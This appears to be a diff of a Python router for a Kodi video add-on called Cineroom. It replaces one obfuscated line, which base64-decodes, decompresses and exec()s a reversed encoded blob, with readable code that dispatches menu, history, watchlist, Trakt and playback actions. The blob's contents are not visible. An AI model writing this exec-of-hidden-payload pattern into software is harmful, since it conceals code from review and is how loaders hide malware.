@@ -1,1 +1,472 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+# -*- coding: utf-8 -*-
+import sys
+import xbmc
+from urllib.parse import parse_qsl
+
+# ── Imports mínimos no topo — APENAS o que é necessário antes de ler a action ──
+# xbmcaddon.Addon() é instanciado UMA vez em context.py — não repetir aqui.
+# ICON_PATH e ADDON_PATH foram removidos: constants.py não depende mais de Addon().
+
+# Sets de actions — custo zero, são apenas literais Python
+_HISTORY_ACTIONS = {
+    'show_history_menu',
+    'list_history_all',
+    'list_history_movies',
+    'list_history_tvshows',
+    'list_history_in_progress',
+    'list_history_liked',
+    'list_history_liked_movies',
+    'list_history_liked_tvshows',
+    'list_history_disliked',
+    'list_history_disliked_movies',
+    'list_history_disliked_tvshows',
+    'list_history_movies_in_progress',
+    'list_history_tvshows_in_progress',
+    'mark_tvshow_watched_dialog',
+    'mark_episode_watched',
+    'mark_movie_watched',
+    'rating_remove',
+    'history_remove',
+    'history_unwatch',
+    'backup_menu',
+    'backup_export',
+    'backup_import',
+    'backup_configure',
+    'backup_toggle_auto',
+}
+
+_RECOMMENDATIONS_ACTIONS = {
+    'show_recommendations_menu',
+    'list_recommendations_movies',
+    'list_recommendations_tvshows',
+}
+
+_WATCHLIST_ACTIONS = {
+    'show_watchlist_menu',
+    'list_watchlist_all',
+    'list_watchlist_movies',
+    'list_watchlist_tvshows',
+    'watchlist_remove',
+    'add_to_watchlist',
+    'remove_from_watchlist',
+}
+
+_MENU_ACTIONS = {
+    'movies_menu',
+    'tvshows_menu',
+    'tools_menu',
+    'account_menu',
+    'movies_explore_menu',
+    'tvshows_explore_menu',
+}
+
+_FAVORITES_ACTIONS = {
+    'add_to_favorites',
+    'remove_from_favorites',
+    'favorites_menu',
+    'favorites_movies',
+    'favorites_tvshows',
+    'favorites_actors',
+    'remove_actor_from_favorites',
+}
+
+# ── Migração de settings ───────────────────────────────────────────────────────
+_details_migrated = False
+
+def _migrate_details_settings():
+    global _details_migrated
+    if _details_migrated:
+        return
+    # Lazy import: só acessa ADDON quando realmente necessário
+    from .context import ADDON
+    if ADDON.getSetting('migrated_details_v3') == '1':
+        _details_migrated = True
+        return
+    try:
+        ADDON.setSetting('movie.enable_details', 'false')
+        ADDON.setSetting('tvshow.enable_details', 'false')
+        ADDON.setSetting('view_mode_enabled', 'true')
+        ADDON.setSetting('view_mode', 'infowall')
+        ADDON.setSetting('ui.details_style', 'Lite')
+        ADDON.setSetting('lightweight_mode', 'false')
+        ADDON.setSetting('menu_view_mode', 'list')
+        ADDON.setSetting('playback.preferred_quality', '4K')
+    except Exception as e:
+        xbmc.log(f'[Cineroom] _migrate_details_settings erro: {e}', xbmc.LOGWARNING)
+    ADDON.setSetting('migrated_details_v3', '1')
+    _details_migrated = True
+
+
+# ── Router principal ───────────────────────────────────────────────────────────
+
+def router():
+    # context importado aqui, não no topo do módulo,
+    # para não pagar o custo em imports parciais feitos pelo próprio Kodi
+    from .context import ADDON, end_dir, get_module, get_profile_manager
+
+    params = dict(parse_qsl(sys.argv[2][1:])) if len(sys.argv) > 2 and sys.argv[2] else {}
+    action = params.get('action', '')
+
+    _migrate_details_settings()
+
+    # ── ROOT ──────────────────────────────────────────────────────────────────
+    if not action:
+        nav   = get_module('navigation')
+        const = get_module('constants')
+        pm    = get_profile_manager()
+
+        if pm and pm.should_show_profile_selector():
+            profile = pm.show_profile_selector()
+            if not profile:
+                nav.show_main_menu(const.MAIN_MENU)
+            return end_dir(True)
+
+        _build_main_menu(nav, const, pm)
+        end_dir(True)
+
+
+        # Pós-render em background — não bloqueia o menu
+        import threading
+        def _post_render():
+            _auto_heal_db()
+            try:
+                from resources.lib.notification import show_notifications_panel
+                actions = show_notifications_panel()
+                for act in actions:
+                    xbmc.executebuiltin(
+                        f'RunPlugin(plugin://plugin.video.cineroom.lite/?action={act})'
+                    )
+            except Exception as e:
+                xbmc.log(f'[Cineroom] Erro na notificação: {e}', xbmc.LOGWARNING)
+        threading.Thread(target=_post_render, daemon=True).start()
+        return
+
+    # ── Noop ──────────────────────────────────────────────────────────────────
+    if action == 'noop':
+        return end_dir(True)
+
+    # ── Troca de perfil ───────────────────────────────────────────────────────
+    if action.startswith('profile_'):
+        from .handlers.profiles import handle_profiles
+        result   = handle_profiles(action, params)
+        addon_id = ADDON.getAddonInfo('id')
+        xbmc.executebuiltin(f'Container.Update(plugin://{addon_id}/,replace)')
+        return end_dir(result)
+
+    # ── Menus (filmes, séries, conta, ferramentas, explorar) ──────────────────
+    # Verificado ANTES de history/watchlist para não pagar custo de sets maiores
+    if action in _MENU_ACTIONS:
+        from .handlers.menu import handle_menu
+        handle_menu(action, params)
+        return
+
+    # ── Histórico, Avaliações e Backup ────────────────────────────────────────
+    if action in _HISTORY_ACTIONS:
+        if action in ('backup_menu', 'backup_export', 'backup_import',
+                      'backup_configure', 'backup_toggle_auto'):
+            from resources.lib.history_backup import (
+                show_backup_menu, export_history, import_history,
+                configure_backup_folder, toggle_auto_backup,
+            )
+            {
+                'backup_menu':        show_backup_menu,
+                'backup_export':      export_history,
+                'backup_import':      import_history,
+                'backup_configure':   configure_backup_folder,
+                'backup_toggle_auto': toggle_auto_backup,
+            }[action]()
+            return end_dir(True)
+
+        if action == 'mark_tvshow_watched_dialog':
+            from resources.lib.tvshows import mark_tvshow_watched_dialog
+            tvshow_tmdb_id = int(
+                params.get('tvshow_tmdb_id') or params.get('tmdb_id') or 0
+            )
+            mark_tvshow_watched_dialog(tvshow_tmdb_id)
+            return end_dir(True)
+
+        if action == 'mark_episode_watched':
+            from resources.lib.history import (
+                mark_episode_watched, mark_episode_unwatched, _get_active_profile_id
+            )
+            from resources.lib.utils import invalidate_watched_cache
+            tmdb_id    = int(params.get('tvshow_tmdb_id', 0))
+            season     = int(params.get('season', 0))
+            episode    = int(params.get('episode', 0))
+            profile_id = _get_active_profile_id()
+            if params.get('watched') == '1':
+                mark_episode_watched(tmdb_id, season, episode, profile_id)
+            else:
+                mark_episode_unwatched(tmdb_id, season, episode, profile_id)
+            invalidate_watched_cache()
+            xbmc.sleep(100)
+            xbmc.executebuiltin('Container.Refresh()')
+            return
+
+        if action == 'mark_movie_watched':
+            from resources.lib.history import (
+                mark_movie_watched, mark_movie_unwatched, _get_active_profile_id
+            )
+            from resources.lib.utils import invalidate_watched_cache
+            tmdb_id    = int(params.get('tmdb_id', 0))
+            profile_id = _get_active_profile_id()
+            if params.get('watched') == '1':
+                mark_movie_watched(tmdb_id, profile_id=profile_id)
+            else:
+                mark_movie_unwatched(tmdb_id, profile_id=profile_id)
+            invalidate_watched_cache()
+            xbmc.sleep(300)
+            xbmc.executebuiltin('Container.Refresh()')
+            return
+
+        from resources.lib import history as hist_mod
+        handler = getattr(hist_mod, action, None)
+        if handler:
+            if action in ('history_remove', 'history_unwatch', 'rating_remove'):
+                handler(params.get('tmdb_id'), params.get('media_type', 'movie'))
+            else:
+                handler()
+            return end_dir(True)
+        return end_dir(False)
+
+    # ── Recomendações ─────────────────────────────────────────────────────────
+    if action in _RECOMMENDATIONS_ACTIONS:
+        from resources.lib import recommendations as rec_mod
+        handler = getattr(rec_mod, action, None)
+        if handler:
+            handler()
+            return end_dir(True)
+        return end_dir(False)
+
+    # ── Watchlist ─────────────────────────────────────────────────────────────
+    if action in _WATCHLIST_ACTIONS:
+        from resources.lib import watchlist as wl_mod
+        if action == 'add_to_watchlist':
+            import json as _json
+            _meta = None
+            try:
+                _meta = _json.loads(params.get('meta', '{}')) or None
+            except Exception:
+                pass
+            wl_mod.add_to_watchlist(
+                int(params.get('tmdb_id', 0)),
+                params.get('media_type', 'movie'),
+                meta=_meta,
+            )
+        if action == 'remove_from_watchlist':
+            wl_mod.remove_from_watchlist(
+                int(params.get('tmdb_id', 0)),
+                params.get('media_type', 'movie'),
+            )
+            xbmc.executebuiltin('Container.Refresh')
+            return end_dir(True)
+        if action == 'watchlist_remove':
+            wl_mod.watchlist_remove(
+                params.get('tmdb_id'), params.get('media_type', 'movie')
+            )
+            return end_dir(True)
+        handler = getattr(wl_mod, action, None)
+        if handler:
+            handler()
+            return end_dir(True)
+        return end_dir(False)
+
+    # ── Favoritos ─────────────────────────────────────────────────────────────
+    if action in _FAVORITES_ACTIONS:
+        from .handlers.favorites import handle_favorites
+        return end_dir(handle_favorites(action, params))
+
+    if action == 'list_actor_titles':
+        from .handlers.favorites import handle_list_actor_titles
+        return end_dir(handle_list_actor_titles(params))
+
+    # ── Routing genérico ──────────────────────────────────────────────────────
+    from .actions import handle_generic_action
+    if handle_generic_action(action, params):
+        return
+
+    # ── Detalhes ──────────────────────────────────────────────────────────────
+    if action == 'show_details':
+        if params.get('track') == '1':
+            try:
+                import json as _json
+                from resources.lib.trending_tracker import queue_track
+                _data = _json.loads(params.get('data', '{}'))
+                queue_track(
+                    tmdb_id=_data.get('tmdb_id'),
+                    imdb_id=_data.get('imdb_id'),
+                    content_type=_data.get('media_type', 'movie'),
+                )
+            except Exception:
+                pass
+        from .handlers.details import handle_show_details
+        return end_dir(handle_show_details(params))
+
+    # ── TV ────────────────────────────────────────────────────────────────────
+    if action == 'list_seasons':
+        if params.get('track') == '1':
+            try:
+                from resources.lib.trending_tracker import queue_track
+                queue_track(
+                    tmdb_id=params.get('tvshow_tmdb_id'),
+                    content_type='tv',
+                )
+            except Exception:
+                pass
+        from .handlers.tv import handle_list_seasons
+        return end_dir(handle_list_seasons(params))
+
+    if action == 'list_episodes':
+        from .handlers.tv import handle_list_episodes
+        return end_dir(handle_list_episodes(params))
+
+    # ── Navegação / Busca / Playback ──────────────────────────────────────────
+    if action in ('search', 'find_sources', 'play_item_direct', 'find_and_play_episode'):
+        if action == 'find_sources' and params.get('track') == '1':
+            try:
+                from resources.lib.trending_tracker import queue_track
+                queue_track(
+                    tmdb_id=params.get('tmdb_id'),
+                    imdb_id=params.get('imdb_id', ''),
+                    content_type=params.get('media_type', 'movie'),
+                )
+            except Exception:
+                pass
+        from .handlers.navigation import handle_navigation
+        return end_dir(handle_navigation(action, params))
+
+    # ── Trakt ─────────────────────────────────────────────────────────────────
+    if action.startswith('trakt_'):
+        from .handlers.trakt import handle_trakt
+        return end_dir(handle_trakt(action, params))
+
+    # ── Biblioteca ────────────────────────────────────────────────────────────
+    if action.startswith('library_'):
+        from .handlers.library import handle_library
+        return end_dir(handle_library(action, params))
+
+    # ── Sistema ───────────────────────────────────────────────────────────────
+    if action in ('run_indexer', 'show_donation', 'open_donation', 'open_settings',
+                  'show_changelog', 'open_provider_manager', 'open_burst_settings'):
+        from .handlers.system import handle_system
+        return end_dir(handle_system(action, params))
+
+    # ── Ator ──────────────────────────────────────────────────────────────────
+    if action == 'show_person':
+        try:
+            from resources.lib.dialog.extras_dialog import show_actor_bio
+            show_actor_bio({
+                'tmdb_person_id': params.get('person_id'),
+                'name':           params.get('name', ''),
+                'profile':        params.get('photo', ''),
+            })
+        except Exception as e:
+            xbmc.log(f'[Cineroom] Erro ao abrir ator: {e}', xbmc.LOGERROR)
+        return end_dir(True)
+
+    return end_dir(False)
+
+
+# ── Helpers ───────────────────────────────────────────────────────────────────
+
+def _build_main_menu(nav, const, pm):
+    from .context import ADDON
+    current_profile = pm.get_current_profile() if pm else None
+    is_kids         = current_profile.get('is_kids', False) if current_profile else False
+
+    base_menu      = const.MAIN_MENU_KIDS if is_kids else const.MAIN_MENU
+    base_menu_list = list(base_menu)
+
+    if not is_kids:
+        trakt_token = ADDON.getSetting('trakt_access_token')
+        if trakt_token:
+            trakt_item = getattr(const, 'MAIN_MENU_TRAKT_ITEM', None)
+            if trakt_item:
+                base_menu_list = base_menu_list + [trakt_item]
+
+    nav.show_main_menu(base_menu_list)
+
+
+_db_healed = False
+
+def _auto_heal_db():
+    global _db_healed
+    if _db_healed:
+        return
+    try:
+        from .context import get_module
+        db = get_module('db')
+        if db and not db.get_all_movie_ids_set():
+            indexer = get_module('indexer')
+            if indexer:
+                indexer.run_indexer()
+        _db_healed = True
+    except Exception as e:
+        xbmc.log(f'[Cineroom] Erro na checagem de banco: {e}', xbmc.LOGERROR)
+
+
+def _invalidate_all_settings_caches():
+    """Chamado após fechar a tela de settings."""
+    try:
+        from resources.lib.utils import (
+            invalidate_res_cache,
+            invalidate_watched_cache,
+            invalidate_library_cache,
+            invalidate_favorites_cache,
+        )
+        invalidate_res_cache()
+        invalidate_watched_cache()
+        invalidate_library_cache()
+        invalidate_favorites_cache()
+    except Exception as e:
+        xbmc.log(f'[Cineroom] _invalidate_all_settings_caches erro: {e}', xbmc.LOGWARNING)
+
+    try:
+        from resources.lib.utils import _SETTINGS
+        _SETTINGS._cache.clear()
+        _SETTINGS._last_check = 0.0
+    except Exception as e:
+        xbmc.log(f'[Cineroom] Erro ao limpar SettingsCache: {e}', xbmc.LOGWARNING)
+
+    try:
+        import resources.lib.utils as _utils_mod
+        _utils_mod._trakt_active = None
+        _utils_mod._RES_CACHE    = None
+    except Exception:
+        pass
+
+    try:
+        from resources.lib.router.context import clear_runtime_caches
+        clear_runtime_caches()
+    except Exception:
+        pass
+
+
+# ── Entrypoint ────────────────────────────────────────────────────────────────
+
+def _safe_init_scrobbler():
+    """Scrobbler em background — nunca bloqueia o menu."""
+    try:
+        from .context import init_scrobbler
+        init_scrobbler()
+    except Exception as e:
+        xbmc.log(f'[Cineroom] Scrobbler erro: {e}', xbmc.LOGWARNING)
+
+
+def run():
+    try:
+        # Scrobbler assíncrono: não bloqueia mais o carregamento do menu
+        import threading
+        threading.Thread(target=_safe_init_scrobbler, daemon=True).start()
+
+        router()
+    except Exception as e:
+        xbmc.log(f'[Cineroom] ERRO CRÍTICO: {e}', xbmc.LOGERROR)
+        import traceback
+        xbmc.log(traceback.format_exc(), xbmc.LOGERROR)
+        # end_dir precisa ser importado aqui pois context pode não ter sido importado ainda
+        try:
+            from .context import end_dir
+            end_dir(False)
+        except Exception:
+            pass
